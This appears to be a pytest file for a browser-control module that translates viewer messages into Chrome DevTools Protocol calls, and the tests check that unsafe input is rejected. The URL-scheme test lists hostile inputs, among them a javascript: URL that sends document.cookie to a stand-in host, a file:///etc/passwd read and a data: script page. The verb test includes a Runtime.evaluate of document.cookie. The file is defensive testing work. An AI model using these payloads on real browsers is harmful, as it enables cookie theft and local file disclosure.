"""Tests for surogates.browser.shell — the pure message→CDP translation."""

from __future__ import annotations

import pytest

from surogates.browser.shell import (
    COMMAND_TYPES,
    SCREENCAST_PARAMS,
    ShellProtocolError,
    translate,
)

VIEWPORT = (1890, 1984)


class TestCoordinates:
    def test_click_scales_normalized_coordinates_to_the_viewport(self) -> None:
        calls = translate({"t": "click", "x": 0.5, "y": 0.25}, viewport=VIEWPORT)
        method, params = calls[0]
        assert method == "Input.dispatchMouseEvent"
        assert params["x"] == 945  # 0.5 * 1890
        assert params["y"] == 496  # 0.25 * 1984

    def test_click_presses_and_releases(self) -> None:
        # A lone mousePressed leaves the button held down and the page in a
        # drag; every click is two events.
        calls = translate({"t": "click", "x": 0.5, "y": 0.5}, viewport=VIEWPORT)
        assert [params["type"] for _m, params in calls] == [
            "mousePressed",
            "mouseReleased",
        ]
        assert {params["x"] for _m, params in calls} == {945}

    @pytest.mark.parametrize("bad", [-0.1, 1.5, float("nan"), "0.5", None])
    def test_out_of_range_coordinates_are_rejected(self, bad: object) -> None:
        # A client that can send x=1e9 dispatches input outside the page.
        with pytest.raises(ShellProtocolError):
            translate({"t": "click", "x": bad, "y": 0.5}, viewport=VIEWPORT)

    def test_click_count_is_bounded(self) -> None:
        with pytest.raises(ShellProtocolError):
            translate(
                {"t": "click", "x": 0.5, "y": 0.5, "count": 99}, viewport=VIEWPORT
            )


class TestNavigateSchemes:
    @pytest.mark.parametrize(
        "url", ["https://example.com/x", "http://example.com"]
    )
    def test_http_and_https_are_allowed(self, url: str) -> None:
        calls = translate({"t": "navigate", "url": url}, viewport=VIEWPORT)
        assert calls == [("Page.navigate", {"url": url})]

    @pytest.mark.parametrize(
        "url",
        [
            "file:///etc/passwd",
            "javascript:fetch('//x/'+document.cookie)",
            "chrome://settings",
            "devtools://devtools/bundled/inspector.html",
            "data:text/html,<script>1</script>",
            "view-source:https://example.com",
            "FILE:///etc/passwd",
            "  javascript:alert(1)",
            "blob:https://example.com/abc",
            "about:blank",
            "/relative/path",
            "",
        ],
    )
    def test_every_other_scheme_is_rejected(self, url: str) -> None:
        # Page.navigate renders local files and executes javascript: URLs.
        # This is the one validation whose failure is a full compromise.
        with pytest.raises(ShellProtocolError):
            translate({"t": "navigate", "url": url}, viewport=VIEWPORT)


class TestKeys:
    def test_named_key_presses_and_releases_with_a_key_code(self) -> None:
        # Chrome ignores a key event carrying only `key` for non-text keys;
        # without the virtual key code Enter does not submit a form.
        calls = translate({"t": "key", "key": "Enter"}, viewport=VIEWPORT)
        assert [params["type"] for _m, params in calls] == ["keyDown", "keyUp"]
        assert all(params["windowsVirtualKeyCode"] == 13 for _m, params in calls)
        assert all(params["key"] == "Enter" for _m, params in calls)

    def test_modifiers_become_a_bitmask(self) -> None:
        calls = translate(
            {"t": "key", "key": "ArrowDown", "mods": {"shift": True, "ctrl": True}},
            viewport=VIEWPORT,
        )
        # CDP: Alt=1, Ctrl=2, Meta=4, Shift=8.
        assert calls[0][1]["modifiers"] == 10

    @pytest.mark.parametrize("key", ["F12", "F1", "a", "I", "Meta", "Unknown"])
    def test_keys_outside_the_named_set_are_rejected(self, key: str) -> None:
        # The named set is an allowlist, not a convenience. F12 and Ctrl+Shift+I
        # are the devtools shortcuts, and devtools is JavaScript execution --
        # the exact capability this protocol exists to withhold.
        with pytest.raises(ShellProtocolError):
            translate({"t": "key", "key": key}, viewport=VIEWPORT)


class TestVerbs:
    def test_type_uses_insert_text(self) -> None:
        # insertText handles IME, paste and non-ASCII in one call and reaches
        # contenteditable, which the xdotool-based endpoint never did.
        calls = translate({"t": "type", "text": "héllo"}, viewport=VIEWPORT)
        assert calls == [("Input.insertText", {"text": "héllo"})]

    def test_overlong_text_is_rejected(self) -> None:
        with pytest.raises(ShellProtocolError):
            translate({"t": "type", "text": "x" * 100_000}, viewport=VIEWPORT)

    def test_scroll_becomes_a_mouse_wheel(self) -> None:
        calls = translate(
            {"t": "scroll", "x": 0.5, "y": 0.5, "dx": 0, "dy": 120},
            viewport=VIEWPORT,
        )
        method, params = calls[0]
        assert method == "Input.dispatchMouseEvent"
        assert params["type"] == "mouseWheel"
        assert params["deltaY"] == 120

    def test_reload_takes_no_arguments_from_the_client(self) -> None:
        # ignoreCache is not the viewer's to set.
        calls = translate(
            {"t": "reload", "ignoreCache": True, "scriptToEvaluateOnLoad": "x"},
            viewport=VIEWPORT,
        )
        assert calls == [("Page.reload", {})]

    @pytest.mark.parametrize(
        "message",
        [
            {"t": "Runtime.evaluate", "expression": "document.cookie"},
            {"t": "Page.captureScreenshot"},
            {"t": None},
            {},
        ],
    )
    def test_unknown_verbs_are_rejected(self, message: dict) -> None:
        with pytest.raises(ShellProtocolError):
            translate(message, viewport=VIEWPORT)


class TestLeaseSurface:
    def test_every_page_acting_verb_needs_the_lease(self) -> None:
        assert COMMAND_TYPES == {
            "click",
            "scroll",
            "type",
            "key",
            "navigate",
            "back",
            "forward",
            "reload",
        }

    def test_switch_tab_is_not_lease_gated(self) -> None:
        # Switching what you watch changes no page state, so a viewer without
        # the lease may still look at another tab.
        assert "switch_tab" not in COMMAND_TYPES


class TestScreencastConfig:
    def test_frames_are_capped(self) -> None:
        # Uncapped, the native 1890x1984 viewport yields 366 KB frames against
        # 74 KB capped -- measured, not estimated.
        assert SCREENCAST_PARAMS["maxWidth"] == 1280
        assert SCREENCAST_PARAMS["maxHeight"] == 800
        assert SCREENCAST_PARAMS["format"] == "jpeg"
